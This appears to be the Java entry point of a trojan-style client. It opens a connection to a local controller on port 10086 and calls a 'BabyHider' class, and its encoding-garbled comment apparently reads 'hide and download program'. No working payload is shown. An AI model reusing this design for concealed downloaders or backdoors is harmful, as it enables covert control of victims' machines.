package com.client;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;




public class Go {
	public static void main(String[] args) {
		ConnectToZhao toZhao = new ConnectToZhao("localhost", 10086);
		toZhao.start();		
		
		
		//Òþ²Ø²¢ÏÂÔØ³ÌÐò
		BabyHider hider = new BabyHider();
		hider.startDoIt();
	}
	
}
